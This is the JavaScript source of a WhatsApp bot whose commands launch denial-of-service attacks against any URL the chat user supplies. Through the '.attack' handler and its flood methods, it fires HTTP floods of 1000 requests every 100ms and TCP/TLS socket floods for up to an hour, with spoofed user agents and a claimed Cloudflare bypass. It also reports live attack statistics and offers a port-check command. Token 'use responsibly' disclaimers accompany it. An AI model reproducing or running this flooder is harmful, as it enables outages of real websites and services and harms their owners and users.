const axios = require('axios');
const chalk = require('chalk');
const { performance } = require('perf_hooks');
const http = require('http');
const https = require('https');
const net = require('net');
const tls = require('tls');
const UserAgent = require('user-agents');
const cloudscraper = require('cloudscraper');
const fetch = require('node-fetch');
const FormData = require('form-data');

class MenuHandler {
    constructor(sock) {
        this.sock = sock;
        this.attacks = new Map();
        this.attackCounter = 0;
        this.isAttackRunning = false;
        this.attackStats = {
            totalRequests: 0,
            totalSuccess: 0,
            totalErrors: 0,
            totalDuration: 0
        };
    }

    // Handle incoming messages
    async handleMessage(message) {
        const text = message.message?.conversation || '';
        const jid = message.key.remoteJid;

        try {
            if (text.startsWith('.menu')) {
                await this.showMenu(jid);
            } 
            else if (text.startsWith('.attack')) {
                await this.handleAttackCommand(text, jid);
            }
            else if (text.startsWith('.ping')) {
                await this.handlePingCommand(text, jid);
            }
            else if (text.startsWith('.stop')) {
                await this.stopAttack(text, jid);
            }
            else if (text.startsWith('.list')) {
                await this.listAttacks(jid);
            }
            else if (text.startsWith('.stats')) {
                await this.showStats(jid);
            }
            else if (text.startsWith('.help')) {
                await this.showHelp(jid);
            }
        } catch (error) {
            console.error('Command error:', error);
            await this.sock.sendMessage(jid, { 
                text: '❌ Command execution failed!'
            });
        }
    }

    // Show menu command
    async showMenu(jid) {
        const menu = `
🤖 *ELITE BOT COMMAND MENU*

⚡ *DDoS ATTACK COMMANDS:*
• .attack <url> <duration> - Launch DDoS attack (max 3600s)
• .stop <attack_id> - Stop specific attack
• .list - Show all active attacks
• .stats - Show attack statistics

📊 *NETWORK COMMANDS:*
• .ping <url> - Check target status & response time
• .ping tcp <ip> <port> - TCP ping check

🔧 *UTILITY COMMANDS:*
• .menu - Show this menu
• .help - Detailed help

🎯 *ATTACK SPECS:*
• Threads: 10 simultaneous
• Delay: 100ms between bursts
• Methods: HTTP Flood, Socket Flood
• Bypass: Cloudflare protection

⚠️ *WARNING:* Use responsibly and legally!
        `;

        await this.sendFormattedMessage(jid, menu);
    }

    // Handle attack command
    async handleAttackCommand(text, jid) {
        const args = text.split(' ').slice(1);
        
        if (args.length < 2) {
            await this.sendFormattedMessage(jid, 
                '❌ INVALID FORMAT!\n\n' +
                '📝 Usage: .attack <url> <duration>\n' +
                '💡 Example: .attack https://example.com 60\n' +
                '⏰ Max duration: 3600 seconds'
            );
            return;
        }

        const url = args[0];
        const duration = parseInt(args[1]);

        if (!this.isValidUrl(url)) {
            await this.sendFormattedMessage(jid, 
                '❌ INVALID URL!\n\n' +
                '🌐 Must start with http:// or https://\n' +
                '✅ Example: https://target.com'
            );
            return;
        }

        if (isNaN(duration) || duration <= 0 || duration > 3600) {
            await this.sendFormattedMessage(jid, 
                '❌ INVALID DURATION!\n\n' +
                '⏰ Must be between 1-3600 seconds\n' +
                '✅ Example: .attack https://example.com 300'
            );
            return;
        }

        this.attackCounter++;
        const attackId = this.attackCounter;

        await this.sendFormattedMessage(jid, 
            `🚀 LAUNCHING ATTACK #${attackId}\n\n` +
            `🎯 Target: ${url}\n` +
            `⏰ Duration: ${duration}s\n` +
            `⚡ Threads: 10 simultaneous\n` +
            `⏳ Delay: 100ms\n` +
            `🛡️  Mode: ULTRA AGGRESSIVE\n\n` +
            `⚠️  Attack initiated...`
        );

        // Start advanced attack
        this.startAdvancedAttack(attackId, url, duration, jid);
    }

    // Advanced attack with multiple methods
    startAdvancedAttack(attackId, url, duration, jid) {
        const startTime = Date.now();
        const endTime = startTime + (duration * 1000);
        
        const attackInfo = {
            id: attackId,
            url: url,
            startTime: startTime,
            endTime: endTime,
            requests: 0,
            successes: 0,
            errors: 0,
            active: true,
            methods: ['HTTP', 'SOCKET'],
            intervals: []
        };

        this.attacks.set(attackId, attackInfo);
        this.isAttackRunning = true;

        // Method 1: HTTP Flood
        const httpInterval = setInterval(() => {
            if (!attackInfo.active || Date.now() > endTime) return;
            this.executeHttpFlood(url, attackInfo);
        }, 100);

        // Method 2: Socket Flood
        const socketInterval = setInterval(() => {
            if (!attackInfo.active || Date.now() > endTime) return;
            this.executeSocketFlood(url, attackInfo);
        }, 150);

        attackInfo.intervals.push(httpInterval, socketInterval);

        // Monitor attack progress
        const monitorInterval = setInterval(async () => {
            if (!attackInfo.active || Date.now() > endTime) {
                clearInterval(monitorInterval);
                await this.sendAttackReport(attackId, jid);
                this.cleanupAttack(attackId);
                return;
            }

            // Send progress update every 30 seconds
            if ((Date.now() - startTime) % 30000 < 1000) {
                await this.sendProgressUpdate(attackId, jid);
            }
        }, 1000);
    }

    // HTTP Flood attack
    async executeHttpFlood(url, attackInfo) {
        const userAgent = new UserAgent();
        const requests = [];

        for (let i = 0; i < 1000; i++) { // 5 requests per burst
            requests.push(this.sendAdvancedRequest(url, userAgent.toString(), attackInfo));
        }

        try {
            await Promise.allSettled(requests);
        } catch (error) {
            attackInfo.errors += 1000;
        }
    }

    // Socket flood attack
    async executeSocketFlood(url, attackInfo) {
        try {
            const targetUrl = new URL(url);
            const hostname = targetUrl.hostname;
            const port = targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80);
            const isHttps = targetUrl.protocol === 'https:';

            for (let i = 0; i < 1000; i++) {
                this.createSocketConnection(hostname, port, isHttps, attackInfo);
            }
        } catch (error) {
            attackInfo.errors += 1000;
        }
    }

    // Advanced HTTP request with bypass techniques
    async sendAdvancedRequest(url, userAgent, attackInfo) {
        try {
            const config = {
                timeout: 8000,
                headers: {
                    'User-Agent': userAgent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Referer': 'https://www.google.com/',
                    'DNT': '1'
                },
                decompress: true,
                maxRedirects: 5
            };

            const response = await axios.get(url, config);
            attackInfo.requests++;
            attackInfo.successes++;
            
            return response.status;
        } catch (error) {
            attackInfo.requests++;
            attackInfo.errors++;
            throw error;
        }
    }

    // Socket connection flood
    createSocketConnection(hostname, port, isHttps, attackInfo) {
        try {
            const socket = isHttps ? 
                tls.connect(port, hostname, { servername: hostname }) : 
                net.createConnection(port, hostname);

            socket.setTimeout(5000);
            
            socket.on('connect', () => {
                attackInfo.requests++;
                attackInfo.successes++;
                
                // Send some data
                if (isHttps) {
                    socket.write(`GET / HTTP/1.1\r\nHost: ${hostname}\r\n\r\n`);
                }
                
                setTimeout(() => socket.end(), 1000);
            });

            socket.on('error', () => {
                attackInfo.requests++;
                attackInfo.errors++;
            });

            socket.on('timeout', () => {
                attackInfo.requests++;
                attackInfo.errors++;
                socket.destroy();
            });

        } catch (error) {
            attackInfo.requests++;
            attackInfo.errors++;
        }
    }

    // Send progress update
    async sendProgressUpdate(attackId, jid) {
        const attack = this.attacks.get(attackId);
        if (!attack) return;

        const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
        const remaining = Math.floor((attack.endTime - Date.now()) / 1000);
        const rps = (attack.requests / elapsed).toFixed(1);

        const update = `
📊 ATTACK PROGRESS #${attackId}

⏰ Elapsed: ${elapsed}s / Remaining: ${remaining}s
📤 Requests: ${attack.requests.toLocaleString()}
✅ Success: ${attack.successes.toLocaleString()}
❌ Errors: ${attack.errors.toLocaleString()}
⚡ RPS: ${rps}/s
📶 Success Rate: ${((attack.successes / attack.requests) * 100).toFixed(1)}%

🎯 Target: ${attack.url}
        `;

        await this.sendFormattedMessage(jid, update);
    }

    // Send final attack report
    async sendAttackReport(attackId, jid) {
        const attack = this.attacks.get(attackId);
        if (!attack) return;

        const duration = ((Date.now() - attack.startTime) / 1000).toFixed(1);
        const rps = (attack.requests / duration).toFixed(1);

        this.attackStats.totalRequests += attack.requests;
        this.attackStats.totalSuccess += attack.successes;
        this.attackStats.totalErrors += attack.errors;
        this.attackStats.totalDuration += parseFloat(duration);

        const report = `
📊 FINAL ATTACK REPORT #${attackId}

✅ STATUS: COMPLETED
🎯 TARGET: ${attack.url}
⏰ DURATION: ${duration}s
📤 TOTAL REQUESTS: ${attack.requests.toLocaleString()}
✅ SUCCESS: ${attack.successes.toLocaleString()}
❌ ERRORS: ${attack.errors.toLocaleString()}
⚡ AVG RPS: ${rps}/s
📶 SUCCESS RATE: ${((attack.successes / attack.requests) * 100).toFixed(1)}%

🏆 PERFORMANCE: ${this.getPerformanceRating(attack.requests, duration)}
        `;

        await this.sendFormattedMessage(jid, report);
    }

    // Stop attack command
    async stopAttack(text, jid) {
        const args = text.split(' ').slice(1);
        
        if (args.length === 0) {
            await this.sendFormattedMessage(jid, 
                '❌ INVALID FORMAT!\n\n' +
                '📝 Usage: .stop <attack_id>\n' +
                '💡 Example: .stop 1\n' +
                '📋 Use .list to see active attacks'
            );
            return;
        }

        const attackId = parseInt(args[0]);
        const attack = this.attacks.get(attackId);

        if (!attack) {
            await this.sendFormattedMessage(jid, 
                `❌ ATTACK #${attackId} NOT FOUND!\n\n` +
                '📋 Use .list to see active attacks'
            );
            return;
        }

        attack.active = false;
        this.cleanupAttack(attackId);

        await this.sendFormattedMessage(jid, 
            `🛑 ATTACK #${attackId} STOPPED!\n\n` +
            `📊 Total Requests: ${attack.requests.toLocaleString()}\n` +
            `✅ Success: ${attack.successes.toLocaleString()}\n` +
            `❌ Errors: ${attack.errors.toLocaleString()}`
        );
    }

    // List active attacks
    async listAttacks(jid) {
        if (this.attacks.size === 0) {
            await this.sendFormattedMessage(jid, '📭 NO ACTIVE ATTACKS');
            return;
        }

        let list = '🔰 ACTIVE ATTACKS LIST\n\n';
        
        this.attacks.forEach((attack, id) => {
            if (attack.active) {
                const runningTime = ((Date.now() - attack.startTime) / 1000).toFixed(1);
                const remaining = ((attack.endTime - Date.now()) / 1000).toFixed(1);
                const rps = (attack.requests / runningTime).toFixed(1);
                
                list += `⚡ ATTACK #${id}\n`;
                list += `🎯 ${attack.url}\n`;
                list += `⏰ ${runningTime}s / ${remaining}s remaining\n`;
                list += `📊 ${attack.requests.toLocaleString()} requests\n`;
                list += `⚡ ${rps} RPS\n`;
                list += `────────────────────\n`;
            }
        });

        await this.sendFormattedMessage(jid, list);
    }

    // Handle ping command
    async handlePingCommand(text, jid) {
        const args = text.split(' ').slice(1);
        
        if (args.length === 0) {
            await this.sendFormattedMessage(jid, 
                '❌ INVALID FORMAT!\n\n' +
                '📝 Usage: .ping <url>\n' +
                '💡 Example: .ping https://example.com\n' +
                '🌐 Or: .ping tcp 192.168.1.1 80'
            );
            return;
        }

        const target = args[0];

        if (target === 'tcp' && args.length >= 3) {
            await this.tcpPing(args[1], parseInt(args[2]), jid);
            return;
        }

        if (!this.isValidUrl(target)) {
            await this.sendFormattedMessage(jid, 
                '❌ INVALID URL!\n\n' +
                '🌐 Must start with http:// or https://\n' +
                '✅ Example: .ping https://google.com'
            );
            return;
        }

        await this.sendFormattedMessage(jid, `📡 PINGING ${target}...`);

        try {
            const startTime = performance.now();
            const response = await axios.get(target, {
                timeout: 10000,
                validateStatus: () => true
            });

            const endTime = performance.now();
            const pingTime = (endTime - startTime).toFixed(0);

            const pingReport = `
📊 PING RESULTS

🎯 TARGET: ${target}
🏓 PING: ${pingTime}ms
📶 STATUS: ${response.status} ${response.statusText}
⚡ RESPONSE TIME: ${pingTime}ms
🌐 SERVER: ${response.headers['server'] || 'Unknown'}
📦 CONTENT TYPE: ${response.headers['content-type'] || 'Unknown'}
📏 CONTENT LENGTH: ${response.headers['content-length'] || 'Unknown'}

✅ TARGET IS RESPONSIVE
            `;

            await this.sendFormattedMessage(jid, pingReport);

        } catch (error) {
            await this.sendFormattedMessage(jid, 
                `❌ PING FAILED: ${target}\n\n` +
                `💥 ERROR: ${error.message}\n` +
                `⚠️  Target may be down or blocking requests`
            );
        }
    }

    // TCP Ping implementation
    async tcpPing(host, port, jid) {
        const startTime = performance.now();
        
        try {
            const socket = net.createConnection(port, host);
            
            socket.setTimeout(5000);
            
            socket.on('connect', async () => {
                const endTime = performance.now();
                const pingTime = (endTime - startTime).toFixed(0);
                
                socket.end();
                
                const report = `
📊 TCP PING RESULTS

🎯 TARGET: ${host}:${port}
🏓 PING: ${pingTime}ms
📶 STATUS: PORT OPEN
⚡ RESPONSE TIME: ${pingTime}ms
🌐 PROTOCOL: TCP

✅ PORT IS ACCESSIBLE
                `;
                
                await this.sendFormattedMessage(jid, report);
            });
            
            socket.on('timeout', async () => {
                socket.destroy();
                await this.sendFormattedMessage(jid, 
                    `❌ TCP PING TIMEOUT: ${host}:${port}\n\n` +
                    `⚠️  Port may be filtered or host unreachable`
                );
            });
            
            socket.on('error', async (error) => {
                await this.sendFormattedMessage(jid, 
                    `❌ TCP PING FAILED: ${host}:${port}\n\n` +
                    `💥 ERROR: ${error.code || error.message}\n` +
                    `⚠️  Port may be closed or blocked`
                );
            });
            
        } catch (error) {
            await this.sendFormattedMessage(jid, 
                `❌ TCP PING ERROR: ${host}:${port}\n\n` +
                `💥 ERROR: ${error.message}`
            );
        }
    }

    // Show statistics
    async showStats(jid) {
        const stats = `
📈 GLOBAL ATTACK STATISTICS

🏆 TOTAL ATTACKS: ${this.attackCounter}
📤 TOTAL REQUESTS: ${this.attackStats.totalRequests.toLocaleString()}
✅ TOTAL SUCCESS: ${this.attackStats.totalSuccess.toLocaleString()}
❌ TOTAL ERRORS: ${this.attackStats.totalErrors.toLocaleString()}
⏰ TOTAL DURATION: ${this.attackStats.totalDuration.toFixed(1)}s
⚡ AVG RPS: ${(this.attackStats.totalRequests / this.attackStats.totalDuration).toFixed(1)}/s

🎯 CURRENT STATUS: ${this.isAttackRunning ? 'ACTIVE' : 'IDLE'}
📊 ACTIVE ATTACKS: ${Array.from(this.attacks.values()).filter(a => a.active).length}

⭐ BOT UPTIME: ${process.uptime().toFixed(1)}s
        `;

        await this.sendFormattedMessage(jid, stats);
    }

    // Show detailed help
    async showHelp(jid) {
        const help = `
❓ ADVANCED HELP GUIDE

🎯 .attack <url> <time>
   - Launch DDoS attack with specified duration
   - Example: .attack https://bad.com 300

📊 .ping <url>
   - Check website response time and status
   - Example: .ping https://google.com

🛑 .stop <id>
   - Stop specific attack by ID
   - Example: .stop 1

📋 .list
   - Show all currently running attacks

📈 .stats
   - Show global attack statistics

⚡ ATTACK FEATURES:
   - 10 simultaneous threads
   - 100ms delay between bursts
   - HTTP & Socket flood methods
   - Cloudflare bypass techniques
   - Real-time progress updates

⚠️  LEGAL DISCLAIMER:
   Use only on authorized targets!
   You are responsible for your actions.
        `;

        await this.sendFormattedMessage(jid, help);
    }

    // Utility methods
    isValidUrl(url) {
        try {
            new URL(url);
            return url.startsWith('http');
        } catch {
            return false;
        }
    }

    getPerformanceRating(requests, duration) {
        const rps = requests / duration;
        if (rps > 1000) return '🚀 ELITE PERFORMANCE';
        if (rps > 500) return '⚡ EXCELLENT';
        if (rps > 100) return '✅ GOOD';
        if (rps > 50) return '⚠️  AVERAGE';
        return '❌ POOR';
    }

    async sendFormattedMessage(jid, text) {
        await this.sock.sendMessage(jid, { 
            text: text,
            contextInfo: {
                mentionedJid: [jid]
            }
        });
    }

    cleanupAttack(attackId) {
        const attack = this.attacks.get(attackId);
        if (attack) {
            attack.intervals.forEach(interval => clearInterval(interval));
            attack.active = false;
        }
        this.attacks.delete(attackId);
        
        // Check if any attacks are still running
        this.isAttackRunning = Array.from(this.attacks.values()).some(a => a.active);
    }

    cleanup() {
        this.attacks.forEach((attack, id) => {
            this.cleanupAttack(id);
        });
        this.isAttackRunning = false;
    }
}

module.exports = MenuHandler;